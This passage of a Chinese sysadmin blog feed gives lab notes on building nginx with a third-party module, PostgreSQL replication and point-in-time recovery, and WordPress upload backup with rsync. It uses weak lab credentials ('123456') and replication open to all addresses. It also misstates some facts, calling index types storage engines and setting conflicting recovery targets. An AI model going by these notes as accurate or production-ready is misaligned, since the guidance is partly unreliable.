daemon-reload<br>    systemctl <span class="hljs-built_in">enable</span> --now nginx &amp;&gt; /dev/null <br>    systemctl is-active nginx &amp;&gt; /dev/null ||  &#123; color <span class="hljs-string">&quot;nginx 启动失败,退出!&quot;</span> 1 ; <span class="hljs-built_in">exit</span>; &#125;<br>    color <span class="hljs-string">&quot;nginx 安装完成&quot;</span> 0<br>&#125;<br><br>check<br>install<br></code></pre></td></tr></table></figure><h1 id="8-任意编译一个第3方nginx模块，并使用。"><a href="#8-任意编译一个第3方nginx模块，并使用。" class="headerlink" title="8. 任意编译一个第3方nginx模块，并使用。"></a>8. 任意编译一个第3方nginx模块，并使用。</h1><p>通过echo打印变量出来，直接调用echo的模块方法，变量列表：<a href="https://nginx.org/en/docs/varindex.html">https://nginx.org/en/docs/varindex.html</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://github.com/openresty/echo-nginx-module/archive/refs/tags/v0.63.tar.gz<br>tar xf xxx.tar.gz<br><br><span class="hljs-comment">##进入到1.20版本重新编译</span><br><span class="hljs-built_in">cd</span> /usr/local/src/nginx-1.20.2<br>./configure --prefix=/apps/nginx --user=nginx --group=nginx --with-http_ssl_module --with-http_v2_module --with-http_realip_module --with-http_stub_status_module --with-http_gzip_static_module --with-pcre --with-stream --with-stream_ssl_module --with-stream_realip_module --add-module=/usr/local/src/echo-nginx-module-0.63<br><br>make -j 2 &amp;&amp; make install <br><br>重启nginx服务<br>nginx -s stop<br>nginx<br>或者<br>systemctl restart nginx<br><br><span class="hljs-comment">##匹配echo字符串</span><br>location /echo &#123;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;this is a echo test&quot;</span>;<br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$remote_addr</span>;<br>&#125;<br><br><span class="hljs-comment">##远端服务器测试，获取了客户端的地址</span><br>curl -s http://pc.catyer.cn/echo<br>this is a <span class="hljs-built_in">echo</span> <span class="hljs-built_in">test</span><br>10.0.0.128<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>第七周</title>
    <link href="/2023/07/28/%E7%AC%AC%E4%B8%83%E5%91%A8/"/>
    <url>/2023/07/28/%E7%AC%AC%E4%B8%83%E5%91%A8/</url>
    
    <content type="html"><![CDATA[<h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="1、postgresql架构与原理"><a href="#1、postgresql架构与原理" class="headerlink" title="1、postgresql架构与原理"></a>1、postgresql架构与原理</h2><blockquote><p>PostgreSQL 是当前功能最强大的开源的关系型数据库系统，支持跨平台的多种操作系统，基于C语言开发。通常简称为<strong>PG</strong>或<strong>PGSQL</strong>。</p><p>PostgreSQL 宣称是世界上最先进的开源数据库。PostgreSQL的狂热者认为它的<strong>性能和Oracle不分上下</strong>，<strong>而且没有高成本的负担</strong>。</p><p><strong><a href="https://www.postgresql.org/">官网</a></strong></p><p><strong><a href="http://www.postgres.cn/">中文社区</a></strong></p><p><strong><a href="http://www.postgres.cn/docs/12/index.html">中文手册</a></strong></p></blockquote><blockquote><p><strong>基本要素：</strong></p><ol><li>存储引擎：这是PostgreSQL用来存储数据的核心组件。它负责将数据存储在磁盘上，并支持查询和事务处理。PostgreSQL有多种不同的存储引擎可供选择，包括B-树存储引擎（默认存储引擎）和哈希存储引擎。</li><li>缓冲池：这是一个用于缓存数据和索引的内存区域。当数据或索引需要被访问时，它们会被加载到缓冲池中。这样，在之后的访问中就可以快速访问数据，而不必再次从磁盘中加载。</li><li>事务日志：PostgreSQL使用事务日志来记录所有的修改操作，以便在发生故障时恢复数据。事务日志还被用于支持复制和恢复数据库。</li><li>SQL解释器：这是PostgreSQL用来解析和执行SQL语句的组件。它根据SQL语句的内容生成执行计划，并将其传递给存储引擎来执行。</li></ol></blockquote><h2 id="-1"><a href="#-1" class="headerlink" title=""></a></h2><hr><h2 id="2、基于流复制完成postgresql的高可用"><a href="#2、基于流复制完成postgresql的高可用" class="headerlink" title="2、基于流复制完成postgresql的高可用"></a>2、基于流复制完成postgresql的高可用</h2><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">主库：10.0.0.136 从库：10.0.0.138<br><br>主库上配置：<br>创建复制用户：create user repluser with replication  password <span class="hljs-string">&#x27;123456&#x27;</span>;<br>在pg_hba.conf中添加：host    replication     all             0.0.0.0/0               md5 <span class="hljs-comment">#允许任何用户从任何地址使用密码验证复制数据</span><br><span class="hljs-comment">#重启服务</span><br>systemctl restart pgsql.service<br><br>从节点配置：<br>systemctl stop postgresql.service <span class="hljs-comment">#停止服务</span><br><span class="hljs-built_in">rm</span> -rf /pgsql/data/* <span class="hljs-comment">#删除数据文件</span><br><span class="hljs-built_in">rm</span> -rf /archive/*  <span class="hljs-comment">#删除归档日志文件</span><br><br><span class="hljs-comment">#全量备份</span><br>pg_basebackup -D /pgsql/backup/ -Ft -Pv -Upostgres -h 10.0.0.136 -p 5432 -R<br><br><span class="hljs-comment">#恢复数据文件</span><br>tar xf /pgsql/backup/base.tar -C /pgsql/data/<br>tar xf /pgsql/backup/pg_wal.tar -C /archive/<br><br><span class="hljs-comment">#修改配置文件</span><br>vim /pgsql/data/postgres.conf<br>primary_conninfo = <span class="hljs-string">&#x27;host=10.0.0.136 port=5432 user=repluser password=123456&#x27;</span><br>restore_command = <span class="hljs-string">&#x27;cp /archive/%f %p&#x27;</span><br><br><span class="hljs-comment">#启动服务</span><br>systemctl start postgresql.service<br><br>结果：<br>主库状态：<br>pg_controldata <br>pg_control version number:            1300<br>Catalog version number:               202107181<br>Database system identifier:           7150164135374356869<br>Database cluster state:               <span class="hljs-keyword">in</span> production<br>pg_control last modified:             Wed 19 Oct 2022 10:55:49 PM CST<br>Latest checkpoint location:           0/2D000228<br>Latest checkpoint<span class="hljs-string">&#x27;s REDO location:    0/2D0001F0</span><br><span class="hljs-string">Latest checkpoint&#x27;</span>s REDO WAL file:    00000002000000000000002D<br><br>从库状态：<br>pg_controldata <br>pg_control version number:            1300<br>Catalog version number:               202107181<br>Database system identifier:           7150164135374356869<br>Database cluster state:               <span class="hljs-keyword">in</span> archive recovery<br>pg_control last modified:             Thu 20 Oct 2022 06:57:53 AM CST<br>Latest checkpoint location:           0/2D000228<br>Latest checkpoint<span class="hljs-string">&#x27;s REDO location:    0/2D0001F0</span><br><span class="hljs-string">Latest checkpoint&#x27;</span>s REDO WAL file:    00000002000000000000002D<br></code></pre></td></tr></table></figure><h2 id="-2"><a href="#-2" class="headerlink" title=""></a></h2><hr><h2 id="3、实现postgresql的时间点还原"><a href="#3、实现postgresql的时间点还原" class="headerlink" title="3、实现postgresql的时间点还原"></a>3、实现postgresql的时间点还原</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">#######场景：每天定时全量备份，第二天误删数据库，然后恢复########</span><br><span class="hljs-comment">#主服务器PG库</span><br><br><span class="hljs-comment">#开启归档日志</span><br>vim /pgsql/data/postgres.conf<br>archive_mode = on<br>archive_command = <span class="hljs-string">&#x27;[ ! -f /archive/%f ] &amp;&amp;cp %p /archive/%f&#x27;</span><br><br><span class="hljs-comment">#重启服务</span><br>pg_ctl restart -D <span class="hljs-variable">$PGDATA</span> <br><br><span class="hljs-comment">#创建测试数据库</span><br>create database testdb;<br>\c testdb<br>create table tb1(<span class="hljs-built_in">id</span> int);<br>insert into tb1 values(1);<br><br><span class="hljs-comment">#备份服务器上做全量备份</span><br><span class="hljs-comment">#提前在备份服务安装好postgresql数据库，创建/pgsql/backup和/archive目录，并设置所有者</span><br><br><span class="hljs-comment">#全量备份</span><br>pg_basebackup -D /pgsql/backup/ -Ft -Pv -Upostgres -h 10.0.0.136 -p 5432 -R<br><br><span class="hljs-comment">#主服务器PG库继续写入数据</span><br>\c testdb<br>insert into tb1 values(2);<br>insert into tb1 values(3);<br><br><span class="hljs-comment">#删除数据库</span><br>drop database testdb;<br><br><span class="hljs-comment">#发现故障停止用户访问，</span><br><br><span class="hljs-comment">#查看当前日志文件</span><br>select pg_walfile_name(pg_current_wal_lsn());<br><span class="hljs-comment">#查看事务ID</span><br>select txid_current();<br><br><span class="hljs-comment">#在PG服务器上切换归档日志</span><br>select pg_switch_wal();<br><br><span class="hljs-comment">#接下来在备份服务器操作</span><br><br>pg_ctl stop -D <span class="hljs-variable">$PGDATA</span> <span class="hljs-comment">#停止服务</span><br><span class="hljs-built_in">rm</span> -rf /pgsql/data/* <span class="hljs-comment">#删除数据文件</span><br><span class="hljs-built_in">rm</span> -rf /archive/*  <span class="hljs-comment">#删除归档日志文件</span><br><br><span class="hljs-comment">#恢复数据文件</span><br>tar xf /pgsql/backup/base.tar -C /pgsql/data/<br><span class="hljs-comment">#恢复归档日志</span><br>rsync -a 10.0.0.136:/archive/ /archive/<br><br><span class="hljs-comment">#查看故障事务点ID</span><br>pg_waldump /archive/000000020000000000000025 | grep -B 10 <span class="hljs-string">&quot;DROP dir&quot;</span><br>rmgr: Standby     len (rec/tot):     50/    50, tx:          0, lsn: 0/25000028, prev 0/24000138, desc: RUNNING_XACTS nextXid 783 latestCompletedXid 782 oldestRunningXid 783<br>rmgr: Heap        len (rec/tot):     54/   150, tx:        783, lsn: 0/25000060, prev 0/25000028, desc: INSERT off 2 flags 0x00, blkref <span class="hljs-comment">#0: rel 1663/13025/24657 blk 0 FPW</span><br>rmgr: Transaction len (rec/tot):     34/    34, tx:        783, lsn: 0/250000F8, prev 0/25000060, desc: COMMIT 2022-10-18 21:31:51.510019 CST<br>rmgr: Standby     len (rec/tot):     50/    50, tx:          0, lsn: 0/25000120, prev 0/250000F8, desc: RUNNING_XACTS nextXid 784 latestCompletedXid 783 oldestRunningXid 784<br>rmgr: Heap        len (rec/tot):     59/  2583, tx:        784, lsn: 0/25000158, prev 0/25000120, desc: DELETE off 11 flags 0x00 KEYS_UPDATED , blkref <span class="hljs-comment">#0: rel 1664/0/1262 blk 0 FPW</span><br>rmgr: Standby     len (rec/tot):     54/    54, tx:          0, lsn: 0/25000B70, prev 0/25000158, desc: RUNNING_XACTS nextXid 785 latestCompletedXid 783 oldestRunningXid 784; 1 xacts: 784<br>rmgr: Standby     len (rec/tot):     54/    54, tx:          0, lsn: 0/25000BA8, prev 0/25000B70, desc: RUNNING_XACTS nextXid 785 latestCompletedXid 783 oldestRunningXid 784; 1 xacts: 784<br>rmgr: XLOG        len (rec/tot):    114/   114, tx:          0, lsn: 0/25000BE0, prev 0/25000BA8, desc: CHECKPOINT_ONLINE redo 0/25000BA8; tli 2; prev tli 2; fpw <span class="hljs-literal">true</span>; xid 0:785; oid 32848; multi 1; offset 0; oldest xid 726 <span class="hljs-keyword">in</span> DB 1; oldest multi 1 <span class="hljs-keyword">in</span> DB 1; oldest/newest commit timestamp xid: 0/0; oldest running xid 784; online<br>rmgr: Database    len (rec/tot):     38/    38, tx:        784, lsn: 0/25000C58, prev 0/25000BE0, desc: DROP <span class="hljs-built_in">dir</span> 1663/24656<br><br><span class="hljs-comment">#最下面一行发现故障点ID为784，则正常数据事件ID为783，而正常事务ID的COMMIT时间为2022-10-18 21:31:51（已用红字标注）</span><br><br><span class="hljs-comment">#修改配置文件</span><br>vi /pgsql/data/postgresql.conf<br>recovery_target_name = <span class="hljs-string">&#x27;restore_point&#x27;</span> <span class="hljs-comment">#指定还原点名称</span><br>recovery_target_time = <span class="hljs-string">&#x27;2022-10-18 21:31:51&#x27;</span> <span class="hljs-comment">#指定还原至时间点</span><br>recovery_target_lsn = <span class="hljs-string">&#x27;0/250000F8&#x27;</span> <span class="hljs-comment">#指定还原到LSN号的位置</span><br><br><span class="hljs-comment">#启动服务</span><br>pg_ctl start -D <span class="hljs-variable">$PGDATA</span><br><br><span class="hljs-comment">#查看数据是否恢复</span><br><br><span class="hljs-comment">###########恢复完成后发现数据库只能读取，无法写入。</span><br>insert into t1 values(4);<br>ERROR: cannot execute INSERT <span class="hljs-keyword">in</span> a read-only transaction<br><br><span class="hljs-comment">#查看数据库状态，发现是归档恢复状态</span><br>pg_controldata<br>Database cluster state: <span class="hljs-keyword">in</span> archive recovery<br><span class="hljs-comment">#</span><br><span class="hljs-comment">#恢复可读可写模式</span><br>select pg_wal_replay_resume();<br><span class="hljs-comment">#数据库状态变为</span><br>Database cluster state: <span class="hljs-keyword">in</span> production<br><br><span class="hljs-comment">#还原完成</span><br></code></pre></td></tr></table></figure><h2 id="-3"><a href="#-3" class="headerlink" title=""></a></h2><h1 id="4-wordpress-nfs架构"><a href="#4-wordpress-nfs架构" class="headerlink" title="4.wordpress+nfs架构"></a>4.wordpress+nfs架构</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">环境：<br>10.0.0.128 apache+wordpress服务，数据库主库指向10.0.0.132，基于docker来安装，映射出来，docker安装wordpress<br>10.0.0.132 MySQL(主)，备份服务器<br>10.0.0.129 MySQL(从)，NAS服务器，NAS服务器指向<br></code></pre></td></tr></table></figure><h2 id="1-docker搭建wordpress-MySQL"><a href="#1-docker搭建wordpress-MySQL" class="headerlink" title="1.docker搭建wordpress+MySQL"></a>1.docker搭建wordpress+MySQL</h2><p>docker run的时候，需要-v映射到nfs的共享目录，单个docker的映射目录()</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker pull wordpress<br>docker run --name wordpress -p 8002:80 -v /apps/wordpress:/var/www/html/  -d wordpress<br><br><span class="hljs-comment">#docker run --name wordpress -p 8002:80 -v /apps/uploads:/var/www/html/wp-content/uploads  -d wordpress</span><br><br>docker stop `docker ps  | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br>docker <span class="hljs-built_in">rm</span> -f `docker ps -a | grep wordpress | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>`<br><br><span class="hljs-comment">##查看工作目录，查看从docker仓库下载下来的docker image镜像</span><br><span class="hljs-comment">##docker inspect imageID/image name，就是查看dockerfile</span><br>[root@master ~]<span class="hljs-comment">#docker inspect wordpress | grep -i working</span><br><span class="hljs-string">&quot;WorkingDir&quot;</span>: <span class="hljs-string">&quot;/var/www/html&quot;</span>,<br><br>[root@master ~]<span class="hljs-comment">#docker ps</span><br>CONTAINER ID   IMAGE       COMMAND                  CREATED         STATUS         PORTS                                   NAMES<br>974257bc8c36   wordpress   <span class="hljs-string">&quot;docker-entrypoint.s…&quot;</span>   4 seconds ago   Up 3 seconds   0.0.0.0:8002-&gt;80/tcp, :::8002-&gt;80/tcp   wordpress<br><br>ss -ntl | grep 8002<br>LISTEN     0      128          *:8002                     *:*                  <br>LISTEN     0      128       [::]:8002                  [::]:*      <br><br>10.0.0.128:8002<br><br><span class="hljs-comment">##MySQL操作，需要提前建库和用户</span><br><span class="hljs-comment">##所有的建站信息全部存放在表里</span><br><br>[(none)]&gt;create database wordpress;<br>Query OK, 1 row affected (0.01 sec)<br><br>[(none)]&gt;grant all on wordpress.* to wp@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, 0 rows affected (0.01 sec)<br><br>[(none)]&gt;flush privileges;<br>Query OK, 0 rows affected (0.00 sec)<br></code></pre></td></tr></table></figure><p><img src="2792175-20221121202626903-702756861.png" alt="img"></p><p>新建一篇文章发布</p><p><img src="2792175-20221121202627648-1559238990.png" alt="img"></p><h2 id="2-rsync直接同步uploads目录到备份机-wp"><a href="#2-rsync直接同步uploads目录到备份机-wp" class="headerlink" title="2.rsync直接同步uploads目录到备份机[wp]"></a>2.rsync直接同步uploads目录到备份机[wp]</h2><p>docker搭建映射出来的路径，不能再进行一次挂载，所以说API服务器有两个，IP+相同的端口号，uploads的rsync直接指向到10.0.0.132的复制目录，/data/bak</p><p>[root<a href="https://www.cnblogs.com/catyer/p/16913112.html">@master </a>uploads]#exportfs -r<br>exportfs: /apps/wordpress/wp-content/uploads does not support NFS export</p><p>如果是多个web前端的话，程序可以控制写到LB的IP，负载均衡两个WEB，两个WEB的图片备份都指向备份机器，且两台WEB之间同步图片</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##安装rsync工具和inotify-tools工具</span><br>rpm -q rsync &amp;&gt; /dev/null  || yum -y install rsync<br>rpm -q inotify-tools &amp;&gt; /dev/null  || yum -y install inotify-tools<br><br><span class="hljs-comment">#1.站点图片目录，有记录日期，直接同步这个文件夹，发布新文章，新图片上面都有</span><br>/apps/wordpress/wp-content/uploads<br><br>[root@master 10]<span class="hljs-comment">#ls</span><br>0923test-01-1024x640.jpg  0923test-01-300x188.jpg  0923test-01.jpg     image-150x150.png   image-1568x842.png  image-768x412.png<br>0923test-01-150x150.jpg   0923test-01-768x480.jpg  image-1024x550.png  image-1536x825.png  image-300x161.png   image.png<br><br><span class="hljs-comment">#2.直接使用sersync或者是脚本同步uploads到备份服务器10.0.0.132</span><br>scp sersync2.5.4_64bit_binary_stable_final.tar.gz 10.0.0.128:/root<br>tar xf sersync2.5.4_64bit_binary_stable_final.tar.gz /apps/sersync<br><br><span class="hljs-comment">#3.编辑xml文件</span><br>vim confxml.xml<br>&lt;sersync&gt;<br>        &lt;localpath watch=<span class="hljs-string">&quot;/apps/wordpress/wp-content/uploads&quot;</span>&gt; &lt;!--/apps/wordpress/wp-content/uploads --&gt;<br>            &lt;remote ip=<span class="hljs-string">&quot;10.0.0.132&quot;</span> name=<span class="hljs-string">&quot;wp&quot;</span>/&gt; &lt;!--修改远端rsync备份服务器和备份目录 --&gt;<br>        &lt;/localpath&gt;<br>        &lt;rsync&gt;<br>            &lt;commonParams params=<span class="hljs-string">&quot;-artuz&quot;</span>/&gt;<br>            &lt;auth start=<span class="hljs-string">&quot;true&quot;</span> <span class="hljs-built_in">users</span>=<span class="hljs-string">&quot;rsyncuser&quot;</span> passwordfile=<span class="hljs-string">&quot;/etc/rsync.pas&quot;</span>/&gt; &lt;!--鉴权用户名，调用本地的password文件 --&gt;<br><br><span class="hljs-comment">#4.编辑备份端</span><br>rpm -q rsync &amp;&gt; /dev/null  || yum -y install rsync<br><br>vim /etc/rsyncd.conf<br>[wp]<br>path = /data/wordpress/<br><span class="hljs-comment">##记得要写path/</span><br><span class="hljs-built_in">read</span> only = no<br><span class="hljs-comment">##不只读，可写</span><br>auth <span class="hljs-built_in">users</span> = rsyncuser<br><span class="hljs-comment">##默认用户</span><br>secrets file = /etc/rsync.pas<br><span class="hljs-comment">##默认密码</span><br><br><span class="hljs-comment">##重启服务</span><br>systemctl restart rsyncd<br><br><span class="hljs-comment">#5.运行脚本，监控/data/wordpress/2022/10/的变化</span><br><span class="hljs-comment">#同步前先进行scp同步一遍先</span><br>scp /apps/wordpress/wp-content/uploads/* 10.0.0.132:/data/wordpress/<br><br><span class="hljs-comment">#执行脚本</span><br>master:[root@master GNU-Linux-x86]<span class="hljs-comment">#./sersync2 -dro confxml.xml</span><br><span class="hljs-built_in">nohup</span> ./sersync2 -dro confxml.xml<br><br>ps aux | grep ser<br>root      13227  0.0  0.0 125108   712 ?        Ssl  23:02   0:00 ./sersync2 -dro confxml.xml<br><br><span class="hljs-comment">##监控变化</span><br>backup:watch -n0.5 ll /data/wordpress/2022/10/<br><br>在wordpress站点发布图片，图片名字为10044444test.jpg<br></code></pre></td></tr></table></figure><p><img src="2792175-20221121202628098-1731997520.png" alt="img"></p><h2 id="3-rsync使用脚本-在没有包的情况下，常用"><a href="#3-rsync使用脚本-在没有包的情况下，常用" class="headerlink" title="3.rsync使用脚本(在没有包的情况下，常用)"></a>3.rsync使用脚本(在没有包的情况下，常用)</h2><p>顺便安装了rsync和inotify，可以作为定时任务，或者nohup也行</p><p>缺点：调用多次rsync，有点小毛病，调用多次create，attribu等指令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim inotify_rsync.sh<br><span class="hljs-built_in">nohup</span> ./inotify_rsync.sh<br><br><span class="hljs-comment">##监控NAS目录的变化</span><br>SRC=<span class="hljs-string">&#x27;/apps/wordpress/wp-content/uploads/&#x27;</span><br><span class="hljs-comment">##备份服务器为132的bak，调用rsync的协议</span><br>DEST=<span class="hljs-string">&#x27;rsyncuser@10.0.0.132::wp&#x27;</span><br><br>rpm -q rsync &amp;&gt; /dev/null  || yum -y install rsync<br>rpm -q inotify-tools &amp;&gt; /dev/null  || yum -y install inotify-tools<br><br><span class="hljs-comment">#修改参数，监控文件数量</span><br><span class="hljs-built_in">echo</span> 50000000 &gt; /proc/sys/fs/inotify/max_user_watches<br><span class="hljs-built_in">echo</span> 327679 &gt; /proc/sys/fs/inotify/max_queued_events<br><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;starting monitor file change...&quot;</span><br><span class="hljs-built_in">sleep</span> 2<br><span class="hljs-comment">#持续前台监控特定事件,定义时间格式、日期格式、动作(新建、删除、移动---重命名、写入、权限变化) + nas目录，输入到while内</span><br>inotifywait  -mrq  --exclude=<span class="hljs-string">&quot;.*\.swp&quot;</span> --timefmt <span class="hljs-string">&#x27;%Y-%m-%d %H:%M:%S&#x27;</span> --format <span class="hljs-string">&#x27;%T %w %f&#x27;</span> -e create,delete,moved_to,close_write,attrib <span class="hljs-variable">$&#123;SRC&#125;</span> |<span class="hljs-keyword">while</span> <span class="hljs-built_in">read</span> DATE TIME DIR FILE;<span class="hljs-keyword">do</span><br>        FILEPATH=<span class="hljs-variable">$&#123;DIR&#125;</span><span class="hljs-variable">$&#123;FILE&#125;</span><br>        <span class="hljs-comment">##表示新建=新建，删除=删除</span><br>        rsync -az --delete  --password-file=/etc/rsync.pas <span class="hljs-variable">$SRC</span> <span class="hljs-variable">$DEST</span> <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;At <span class="hljs-variable">$&#123;TIME&#125;</span> on <span class="hljs-variable">$&#123;DATE&#125;</span>, file <span class="hljs-variable">$FILEPATH</span> was backuped up via rsync&quot;</span> &gt;&gt; /var/log/changelist.log<br>        <span class="hljs-comment">#日志在129上面，在129上执行的脚本</span><br><span class="hljs-keyword">done</span><br><br>Every 0.5s: tree /data/wordpress/2022/10/  <br>├── test11-1024x640.jpg<br>├── test11-150x150.jpg<br>├── test11-300x188.jpg<br>├── test11-768x480.jpg<br></code></pre></td></tr></table></figure><h2 id="nohup-英文全称-no-hang-up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。"><a href="#nohup-英文全称-no-hang-up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。" class="headerlink" title="nohup 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。"></a><strong>nohup</strong> 英文全称 no hang up（不挂起），用于在系统后台不挂断地运行命令，退出终端不会影响程序的运行。</h2><p>如果不执行nohup则是前台执行</p><h2 id="4-负载均衡架构"><a href="#4-负载均衡架构" class="headerlink" 